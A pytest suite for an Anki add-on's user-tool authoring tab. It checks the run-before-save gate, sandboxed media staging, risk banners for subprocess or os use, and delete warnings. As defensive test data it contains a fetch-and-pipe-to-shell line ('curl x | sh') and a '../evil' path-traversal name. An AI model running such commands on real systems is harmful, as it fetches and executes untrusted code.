"""Tests for the Tools tab: the authoring gate, the delete warning, and the page it lives in.

The controller is the thing that has to hold the safety story, so that is what is asserted
here: ``user_tool_save`` refuses a source the user has not RUN (the disabled Save button is a
courtesy, this is the rule), the authoring prompt survives the round trip to disk and back, and
a delete names the fields it would leave pointing at nothing. The page assertions cover the one
thing only the built HTML can prove — that the tab, its hooks and its "these do not sync"
statement are actually rendered.

Same harness as ``test_smart_notes_dialog_deps``: a tiny fake context and a synchronous stand-in
for ``run_in_background``, so no Qt stack and no real dialog. Every tool file is written under
``tmp_path``.
"""

from __future__ import annotations

import json
import pathlib
import re
import sys
import types
from typing import Any

import pytest

# --- stub the extra aqt symbols the dialogs package imports at module load ----------------
_theme_mod = types.ModuleType("aqt.theme")
_theme_mod.theme_manager = types.SimpleNamespace(night_mode=False)
sys.modules.setdefault("aqt.theme", _theme_mod)

_qt = sys.modules.get("aqt.qt") or types.ModuleType("aqt.qt")
for _name in (
    "QCloseEvent",
    "QComboBox",
    "QDialog",
    "QDialogButtonBox",
    "QLabel",
    "QPlainTextEdit",
    "QPushButton",
    "Qt",
    "QVBoxLayout",
    "QWebEngineView",
    "QWidget",
):
    if not hasattr(_qt, _name):
        setattr(_qt, _name, type(_name, (), {}))
sys.modules["aqt.qt"] = _qt
import aqt  # noqa: E402  (the conftest stub package)

aqt.qt = _qt
aqt.theme = _theme_mod

_webview_mod = types.ModuleType("aqt.webview")
_webview_mod.AnkiWebView = type("AnkiWebView", (), {})
sys.modules.setdefault("aqt.webview", _webview_mod)
aqt.webview = _webview_mod

from omnia.core import anki_compat  # noqa: E402
from omnia.gui.smart_notes.dialogs.controllers.user_tools import (  # noqa: E402
    UserToolsController,
)
from omnia.gui.smart_notes.html import build_smart_notes_html  # noqa: E402
from omnia.plugins.smart_notes.config import (  # noqa: E402
    FieldToolConfig,
    SmartNotesFieldConfig,
    SmartNotesNoteTypeConfig,
    SmartNotesSettings,
)
from omnia.plugins.smart_notes.engine.tools import (  # noqa: E402
    TOOL_REGISTRY,
    UserToolLoader,
    UserToolSource,
    UserToolStore,
    get_tool,
)

_TOOL_SOURCE = '''
from typing import ClassVar

from pydantic import Field

from omnia.core.config.base import PersistedModel
from omnia.plugins.smart_notes.engine.generators import GenerationResult
from omnia.plugins.smart_notes.engine.tools import Produced, Tool, register_tool


class ExtParams(PersistedModel):
    source_field: str = Field("", description="Field holding the filename.")


@register_tool("user:ext")
class ExtTool(Tool):
    """Upper-cases the sample."""

    name: ClassVar[str] = "user:ext"
    label: ClassVar[str] = "Extract extension"
    description: ClassVar[str] = "Output just the file extension."
    kinds: ClassVar[frozenset] = frozenset({"text"})
    deterministic: ClassVar[bool] = True
    params_model: ClassVar[type] = ExtParams

    def run(self, request, ctx):
        value = str(request.fields.get("Sample", ""))
        return Produced(GenerationResult("text", text=value.rsplit(".", 1)[-1]))
'''


def _fake_ctx(**overrides: Any) -> types.SimpleNamespace:
    """A minimal stand-in for ``SmartNotesContext`` (only what this controller touches)."""
    ctx = types.SimpleNamespace(
        eval_js=lambda js: None,
        build_hub=lambda: None,
        friendly=lambda exc, prefix: f"{prefix}: {exc}",
        settings=lambda: SmartNotesSettings(),
    )
    for key, value in overrides.items():
        setattr(ctx, key, value)
    return ctx


@pytest.fixture
def registry_guard():
    """Restore the tool registry after a test that loads tools into it."""
    before = dict(TOOL_REGISTRY)
    yield
    TOOL_REGISTRY.clear()
    TOOL_REGISTRY.update(before)


@pytest.fixture
def sync_background(monkeypatch):
    """Run ``run_in_background`` inline so an off-thread op resolves within the test."""

    def fake_run(op, *, on_success, on_failure=None, label=None, parent=None):
        try:
            result = op()
        except Exception as exc:  # mirror QueryOp's failure branch
            if on_failure is None:
                raise
            on_failure(exc)
            return
        on_success(result)

    monkeypatch.setattr(anki_compat, "run_in_background", fake_run)


@pytest.fixture
def store(tmp_path):
    """The throwaway tools folder every test writes into."""
    return UserToolStore(tmp_path / "tools")


@pytest.fixture
def controller(store, registry_guard, sync_background):
    """A controller over the throwaway folder, plus its fake context and the JS it pushed."""
    pushed: list[str] = []
    ctx = _fake_ctx(eval_js=pushed.append)
    return UserToolsController(ctx, loader=UserToolLoader(store)), ctx, pushed


def _test_run(controller_tuple, source: str = _TOOL_SOURCE) -> dict:
    """Run the test op the way the page does, returning the pushed result payload."""
    controller, _ctx, pushed = controller_tuple
    controller.on_test({"slug": "ext", "source": source, "sample": "clip.mp3"})
    return json.loads(
        pushed[-1].split("window.__snUserToolTested(", 1)[1][:-2].split(", ", 1)[1]
    )


class TestSaveNeedsATestRun:
    """The one rule that makes generated code acceptable: it is never saved unseen."""

    def test_save_is_refused_before_any_test_run(self, controller):
        ctrl, _ctx, _pushed = controller

        result = ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": "p"})

        assert "Run the tool on a sample first" in result["error"]
        assert ctrl.on_list({})["tools"] == []

    def test_save_is_allowed_after_the_source_has_run(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)

        result = ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": "p"})

        assert result["ok"] is True
        assert result["name"] == "user:ext"
        assert get_tool("user:ext") is not None

    def test_editing_the_source_after_the_test_re_arms_the_gate(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)

        result = ctrl.on_save(
            {"slug": "ext", "source": _TOOL_SOURCE + "\n# edited\n", "prompt": "p"}
        )

        assert "Run the tool on a sample first" in result["error"]

    def test_a_test_run_that_fails_still_counts_as_seen(self, controller):
        # The user watched it break; saving a tool that breaks is their call, and the source
        # they save is the source they watched.
        ctrl, _ctx, _pushed = controller
        broken = _TOOL_SOURCE.replace(
            'value = str(request.fields.get("Sample", ""))', 'raise ValueError("kaput")'
        )
        result = _test_run(controller, broken)

        assert result["status"] == "error"
        assert (
            ctrl.on_save({"slug": "ext", "source": broken, "prompt": ""})["ok"] is True
        )

    def test_a_source_that_does_not_compile_is_not_marked_tested(self, controller):
        # `import os` is allowed now, so the refusal has to come from a source that is still
        # genuinely unusable — one that registers no tool at all.
        ctrl, _ctx, pushed = controller
        broken = "import socket\n"

        ctrl.on_test({"slug": "ext", "source": broken, "sample": ""})

        assert "may not import 'socket'" in pushed[-1]
        assert "error" in ctrl.on_save({"slug": "ext", "source": broken})

    def test_testing_reports_the_output_the_user_sees(self, controller):
        result = _test_run(controller)

        assert result["ok"] is True
        assert result["output"] == "mp3"


class TestPersistence:
    def test_the_authoring_prompt_round_trips(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)
        ctrl.on_save(
            {"slug": "ext", "source": _TOOL_SOURCE, "prompt": "take the extension"}
        )

        listed = ctrl.on_list({})["tools"]

        assert [tool["slug"] for tool in listed] == ["ext"]
        assert listed[0]["prompt"] == "take the extension"
        assert listed[0]["source"].strip().startswith("from typing import")
        assert listed[0]["label"] == "Extract extension"

    def test_the_list_carries_the_builtins_and_the_folder(self, controller):
        ctrl, _ctx, _pushed = controller

        payload = ctrl.on_list({})

        names = [tool["name"] for tool in payload["builtins"]]
        assert "ai" in names and "cloze" in names
        assert all(not name.startswith("user:") for name in names)
        assert payload["directory"].endswith("tools")

    def test_a_broken_file_is_listed_with_its_error(self, controller, store):
        ctrl, _ctx, _pushed = controller
        store.write(
            UserToolSource(slug="broken", code='raise RuntimeError("explodes")\n')
        )

        listed = ctrl.on_list({})["tools"]

        assert listed[0]["slug"] == "broken"
        assert "explodes" in listed[0]["error"]
        assert listed[0]["loaded"] is False

    def test_a_name_that_is_not_a_slug_is_refused(self, controller):
        ctrl, _ctx, _pushed = controller

        result = ctrl.on_save({"slug": "../evil", "source": _TOOL_SOURCE})

        assert "not a usable tool name" in result["error"]

    def test_a_label_is_slugified_when_no_slug_is_posted(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)

        result = ctrl.on_save(
            {"label": "Extract Extension!", "source": _TOOL_SOURCE, "prompt": ""}
        )

        # The source registers "user:ext", so the derived slug must NOT match: the failure is
        # reported instead of a file being written under a name nothing registers.
        assert "could not be loaded" in result["error"]
        assert result.get("ok") is None


class TestTheTestRunIsRepresentative:
    """The dialog's Test must give a tool the same context generation will.

    Two constructors build a ToolContext. Wiring one and forgetting the other meant a tool that
    reads media declined on every Test — on a machine with the collection wide open — and the
    gate marks a decline as "seen", so Save unlocked for a tool the user had never watched do
    its job. The end-to-end check that missed this drove UserToolLoader directly; this drives
    the dialog.
    """

    def test_the_test_context_never_points_at_the_live_collection(
        self, controller, monkeypatch, tmp_path
    ):
        """A test run executes arbitrary code that may open files for WRITING.

        Pointing it at the real media folder makes pressing Run destructive: a tool that
        writes its output back over its input truncates the user's own file, and the review
        gate REQUIRES pressing Run. So a test resolves media only against the stage, whose
        contents are copies.
        """
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: "/collection/media"
        )

        assert ctrl._tool_context().media_dir() != "/collection/media"
        assert ctrl._tool_context().media_dir() == ""  # nothing staged yet

        chosen = tmp_path / "clip.mp4"
        chosen.write_bytes(b"x")
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )
        ctrl.on_pick_sample({})

        # …and once a file is picked, it resolves — against the copy, not the original.
        staged = ctrl._tool_context().media_dir()
        assert staged and staged != "/collection/media"
        assert (pathlib.Path(staged) / "clip.mp4").exists()

    def test_generation_still_uses_the_real_collection(self, monkeypatch):
        # The safety narrowing is for the TEST path only. A real run must see real media.
        from omnia.plugins.smart_notes.engine.tools import resolve_media_dir

        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: "/collection/media"
        )

        assert resolve_media_dir() == "/collection/media"

    def test_the_two_contexts_differ_on_purpose(self):
        """Generation sees the real collection; a TEST sees only the stage.

        They used to be required to match, and that was right while both were the same kind of
        run. They are not: a test executes code the user has not finished reviewing, so its
        media folder is a temp copy and the user's own files are out of reach. Generation runs
        code already read and saved, against the real collection, which is the point.

        The shared resolver still exists and is still the ONE way the real folder is found — it
        is simply not what the test path uses.
        """
        import omnia.plugins.smart_notes.engine.service as service
        from omnia.plugins.smart_notes.engine.tools import resolve_media_dir

        assert service.resolve_media_dir is resolve_media_dir


class TestTheWarningPrecedesTheRun:
    """Every path that ends in Run must show the tool's reach BEFORE it runs.

    Run executes the module, and the review gate requires pressing it — so a summary that only
    arrives with the test RESULT describes something that already happened. The generate path
    was fixed first; the EDIT path is the one a user takes with code they did not just watch
    being written.
    """

    def test_listing_a_saved_tool_carries_its_risks(self, controller, store):
        # The edit path renders from this payload. An empty banner over `import subprocess`
        # affirmatively says "only reshapes text", which is the opposite of true.
        ctrl, _ctx, _pushed = controller
        store.write(
            UserToolSource(
                slug="risky",
                code="import subprocess\n@register_tool('user:risky')\nclass T: pass\n",
            )
        )

        payload = ctrl.on_list({})
        listed = {tool["slug"]: tool for tool in payload["tools"]}["risky"]

        assert "runs other programs on your computer" in listed["risks"]

    def test_a_text_only_saved_tool_lists_no_risks(self, controller, store):
        ctrl, _ctx, _pushed = controller
        store.write(UserToolSource(slug="plain", code="import re\n"))

        payload = ctrl.on_list({})
        listed = {tool["slug"]: tool for tool in payload["tools"]}["plain"]

        assert listed["risks"] == []

    def test_the_editor_can_recompute_risks_for_pasted_source(self, controller):
        # Pasting a different tool over this one changes what Run will execute, so the banner
        # has to follow the text in the box rather than whatever arrived with it.
        ctrl, _ctx, _pushed = controller

        result = ctrl.on_risks({"source": "import os\n"})

        assert "run other programs" in result["risks"][0]
        assert ctrl.on_risks({"source": "import re\n"})["risks"] == []

    def test_os_is_not_described_as_filesystem_only(self, controller):
        """`os.system` and `os.popen` run programs.

        The prompt tells the model "pathlib, subprocess and the rest are available", which makes
        `os.system(f"ffmpeg …")` a likely generation — and a reviewer who has learned that "runs
        other programs on your computer" is how that reads would otherwise conclude this tool
        does not.
        """
        ctrl, _ctx, _pushed = controller

        risks = ctrl.on_risks({"source": "import os\nos.system('curl x | sh')\n"})[
            "risks"
        ]

        assert any("run other programs" in risk for risk in risks)


class TestTheMediaSample:
    """Testing a tool that reads a FILE.

    Typing `[sound:x.mp3]` by hand only works if x.mp3 is already in the collection — exactly
    what someone testing a NEW conversion does not have. So the sample can be a file the user
    picks, staged OUTSIDE the collection with the test's media folder pointed at the stage: the
    reference resolves, the tool reads a real file, and nothing is added to synced media.
    """

    def test_picking_a_file_returns_the_reference_and_stages_it(
        self, controller, monkeypatch, tmp_path
    ):
        ctrl, _ctx, _pushed = controller
        chosen = tmp_path / "clip.mp4"
        chosen.write_bytes(b"data")
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )

        result = ctrl.on_pick_sample({})

        assert result["reference"] == "[sound:clip.mp4]"
        assert result["name"] == "clip.mp4"
        # …and the tool under test resolves that reference against the stage.
        staged = pathlib.Path(ctrl._tool_context().media_dir()) / "clip.mp4"
        assert staged.read_bytes() == b"data"

    def test_the_picker_opens_in_the_collection_media_folder(
        self, controller, monkeypatch, tmp_path
    ):
        # The interesting files are already there, and its real path is a per-platform profile
        # location the user has never needed to know.
        ctrl, _ctx, _pushed = controller
        seen: dict = {}
        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: "/collection/media"
        )
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file",
            lambda **kw: seen.update(kw) or "",
        )

        ctrl.on_pick_sample({})

        assert seen["start_dir"] == "/collection/media"

    def test_the_collection_is_never_written_to(
        self, controller, monkeypatch, tmp_path
    ):
        # The whole reason for staging: Anki SYNCS media, so a test that copied its sample in
        # would push it to every device — and pushing a deletion afterwards is no better.
        ctrl, _ctx, _pushed = controller
        collection = tmp_path / "collection.media"
        collection.mkdir()
        chosen = tmp_path / "outside.mp4"
        chosen.write_bytes(b"data")
        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: str(collection)
        )
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )

        ctrl.on_pick_sample({})

        assert list(collection.iterdir()) == []

    def test_picking_again_removes_the_previous_file(
        self, controller, monkeypatch, tmp_path
    ):
        # Otherwise a session accumulates a copy of everything the user browsed through.
        ctrl, _ctx, _pushed = controller
        first, second = tmp_path / "a.mp3", tmp_path / "b.mp3"
        first.write_bytes(b"1")
        second.write_bytes(b"2")

        monkeypatch.setattr("omnia.core.anki_compat.pick_file", lambda **_k: str(first))
        ctrl.on_pick_sample({})
        staged_first = pathlib.Path(ctrl._tool_context().media_dir()) / "a.mp3"
        assert staged_first.exists()

        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(second)
        )
        ctrl.on_pick_sample({})

        assert not staged_first.exists()
        assert (pathlib.Path(ctrl._tool_context().media_dir()) / "b.mp3").exists()

    def test_cancelling_changes_nothing(self, controller, monkeypatch):
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr("omnia.core.anki_compat.pick_file", lambda **_k: "")

        assert ctrl.on_pick_sample({}) == {}

    def test_an_unreadable_file_reports_instead_of_raising(
        self, controller, monkeypatch, tmp_path
    ):
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(tmp_path / "gone.mp4")
        )

        assert "error" in ctrl.on_pick_sample({})

    def test_disposing_removes_the_staging_folder(
        self, controller, monkeypatch, tmp_path
    ):
        # Called from closeEvent: nothing staged for a test may outlive the dialog.
        ctrl, _ctx, _pushed = controller
        chosen = tmp_path / "c.mp3"
        chosen.write_bytes(b"x")
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )
        ctrl.on_pick_sample({})
        stage = pathlib.Path(ctrl._tool_context().media_dir())
        assert stage.exists()

        ctrl.dispose()

        assert not stage.exists()


class TestTheReviewIsToldWhatTheToolReaches:
    """The control that JUSTIFIES widening the allowlist has to actually ship.

    `risky_operations` was written as the compensating control for permitting os/subprocess —
    and for dropping `open` from the flagged calls — but nothing called it. The guard was
    loosened and the mitigation was not delivered: the review screen rendered exactly what it
    rendered before.
    """

    def test_a_file_touching_tool_says_so_in_the_payload(self, controller):
        _ctrl, _ctx, pushed = controller
        source = _TOOL_SOURCE.replace(
            "from typing import ClassVar",
            "import subprocess\nfrom pathlib import Path\nfrom typing import ClassVar",
        )
        assert "import subprocess" in source  # the substitution really happened

        _test_run(controller, source)

        payload = json.loads(
            pushed[-1].split("(", 1)[1].rsplit(");", 1)[0].split(", ", 1)[1]
        )
        assert "reads and writes files" in payload["risks"]
        assert "runs other programs on your computer" in payload["risks"]

    def test_a_text_only_tool_reports_no_risks(self, controller):
        # The banner appearing IS the signal, so a plain transform must not raise one.
        _ctrl, _ctx, pushed = controller

        _test_run(controller)

        payload = json.loads(
            pushed[-1].split("(", 1)[1].rsplit(");", 1)[0].split(", ", 1)[1]
        )
        assert payload["risks"] == []


class TestTheToolsFolderIsNeverHardcoded:
    """Where the tools live is derived, never written down — and shown as such.

    The absolute path was already correct on every platform (it comes from the installed
    package's own location), but the page inlined it into a sentence, so a runtime value read
    as a hardcoded macOS literal. The payload now carries a SHORT label for the sentence and
    keeps the absolute path for the tooltip and the Open-folder button.
    """

    def test_a_real_install_shows_the_short_relative_label(
        self, registry_guard, sync_background, tmp_path, monkeypatch
    ):
        # The real layout: the folder sits under the add-on root, so the label is the stable
        # `user_files/tools` — the same two words on macOS, Windows and Linux.
        addon_root = tmp_path / "addons21" / "123456"
        directory = addon_root / "user_files" / "tools"
        monkeypatch.setattr(
            "omnia.gui.smart_notes.dialogs.controllers.user_tools.addon_user_files_dir",
            lambda: addon_root / "user_files",
        )
        ctrl = UserToolsController(
            _fake_ctx(), loader=UserToolLoader(UserToolStore(directory))
        )

        payload = ctrl.on_list({})

        assert payload["directory_label"] == str(pathlib.Path("user_files") / "tools")
        # …while the absolute path rides along for the tooltip and the Open-folder button.
        assert payload["directory"] == str(directory)

    def test_a_folder_outside_the_addon_falls_back_to_the_absolute_path(
        self, controller, store
    ):
        # A layout the relative form cannot express (a test store, a hand-moved folder). The
        # honest answer is the full path, not a relative one that points somewhere else.
        ctrl, _ctx, _pushed = controller

        payload = ctrl.on_list({})

        assert payload["directory_label"] == str(store.directory)
        assert payload["directory"] == str(store.directory)

    def test_the_label_follows_the_folder_rather_than_naming_a_platform(
        self, registry_guard, sync_background, tmp_path
    ):
        # Two different install locations, neither of them written down anywhere: the label
        # tracks whatever folder the loader was built with.
        for where in ("addons21/12345/user_files/tools", "somewhere/else/tools"):
            directory = tmp_path / where
            ctrl = UserToolsController(
                _fake_ctx(), loader=UserToolLoader(UserToolStore(directory))
            )

            assert ctrl.on_list({})["directory"] == str(directory)

    def test_opening_the_folder_goes_through_the_cross_platform_seam(
        self, controller, store, monkeypatch
    ):
        # No `sys.platform` branch anywhere — Qt resolves Finder/Explorer/xdg-open itself.
        ctrl, _ctx, _pushed = controller
        opened: list[Any] = []
        monkeypatch.setattr(
            "omnia.core.anki_compat.open_local_path", lambda path: opened.append(path)
        )

        result = ctrl.on_open_dir({})

        assert result == {"ok": True}
        assert opened == [store.directory]
        assert (
            store.directory.is_dir()
        )  # created on demand, so the open cannot fail on it

    def test_a_failed_open_reports_instead_of_taking_the_tab_down(
        self, controller, monkeypatch
    ):
        ctrl, _ctx, _pushed = controller

        def boom(_path):
            raise RuntimeError("no file manager")

        monkeypatch.setattr("omnia.core.anki_compat.open_local_path", boom)

        result = ctrl.on_open_dir({})

        assert "no file manager" in result["error"]

    def test_the_op_is_routed(self, controller):
        ctrl, _ctx, _pushed = controller

        assert "user_tool_open_dir" in ctrl.ops()


class TestDelete:
    def _settings_with_usage(self) -> SmartNotesSettings:
        return SmartNotesSettings(
            note_types=[
                SmartNotesNoteTypeConfig(
                    note_type="Vocab",
                    base_field="Word",
                    fields=[
                        SmartNotesFieldConfig(
                            field="Ext", tools=[FieldToolConfig(tool="user:ext")]
                        )
                    ],
                )
            ]
        )

    def test_delete_reports_the_referencing_fields_first(self, controller):
        ctrl, ctx, _pushed = controller
        ctx.settings = self._settings_with_usage
        _test_run(controller)
        ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": ""})

        result = ctrl.on_delete({"slug": "ext"})

        assert result["usages"] == ["Vocab · Ext"]
        assert result.get("ok") is None
        assert ctrl.on_list({})["tools"]  # nothing was deleted yet

    def test_confirming_deletes_the_file_and_unregisters_it(self, controller):
        ctrl, ctx, _pushed = controller
        ctx.settings = self._settings_with_usage
        _test_run(controller)
        ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": ""})

        result = ctrl.on_delete({"slug": "ext", "confirm": True})

        assert result["ok"] is True
        assert ctrl.on_list({})["tools"] == []
        assert get_tool("user:ext") is None

    def test_an_unused_tool_deletes_without_a_warning(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)
        ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": ""})

        result = ctrl.on_delete({"slug": "ext"})

        assert result["ok"] is True
        assert result["usages"] == []


class TestGenerate:
    def test_a_provider_failure_is_pushed_not_raised(self, controller):
        ctrl, ctx, pushed = controller

        class _Hub:
            @staticmethod
            def llm():
                class _LLM:
                    @staticmethod
                    def generate_text(*_a, **_kw):
                        raise RuntimeError("no key")

                return _LLM()

        ctx.build_hub = _Hub
        ctrl.on_generate({"slug": "ext", "prompt": "take the extension"})

        assert "__snUserToolSource" in pushed[-1]
        assert "no key" in pushed[-1]

    def test_the_generated_source_is_pushed_whole(self, controller):
        ctrl, ctx, pushed = controller
        code = '@register_tool("user:ext")\nclass T: pass\n'

        class _Hub:
            @staticmethod
            def llm():
                class _LLM:
                    @staticmethod
                    def generate_text(*_a, **_kw):
                        return code

                return _LLM()

        ctx.build_hub = _Hub
        ctrl.on_generate({"slug": "ext", "prompt": "take the extension"})

        assert "user:ext" in pushed[-1]

    def test_a_missing_description_is_refused_without_a_provider_call(self, controller):
        ctrl, ctx, _pushed = controller
        ctx.build_hub = lambda: None

        assert "Provider config error" in ctrl.on_generate({"slug": "ext"})["error"]


class TestToolsTabPage:
    """What only the built page can prove: the tab exists and says what it must."""

    def _html(self) -> str:
        return build_smart_notes_html(dark=False, init={}, catalog={}, tools=[])

    def test_the_tab_and_its_pane_are_rendered(self):
        html = self._html()

        assert 'data-tab="tools"' in html
        assert 'data-pane="tools"' in html

    def test_showtab_loads_the_tab_lazily(self):
        assert "loadUserTools();" in self._html()

    def test_the_page_states_that_tools_do_not_sync(self):
        html = self._html()

        assert "Anki does not sync them" in html
        assert "this computer" in html

    def test_save_starts_disabled(self):
        html = self._html()

        assert (
            'id="sn-ut-save" class="sn-btn sn-btn-primary" type="button" disabled'
            in html
        )

    def test_the_push_hooks_the_controller_calls_exist(self):
        html = self._html()

        assert "window.__snUserToolSource" in html
        assert "window.__snUserToolTested" in html

    def test_every_element_the_tab_script_grabs_is_in_the_page(self):
        # The page is ONE IIFE: a `getElementById` that returns null makes the very next
        # `addEventListener` throw, and the whole dialog (not just this tab) stops working.
        html = self._html()

        ids = re.findall(r'getElementById\("(sn-ut-[^"]+)"\)', html)

        assert ids, "the Tools tab script did not make it into the page"
        for element_id in ids:
            assert f'id="{element_id}"' in html, element_id
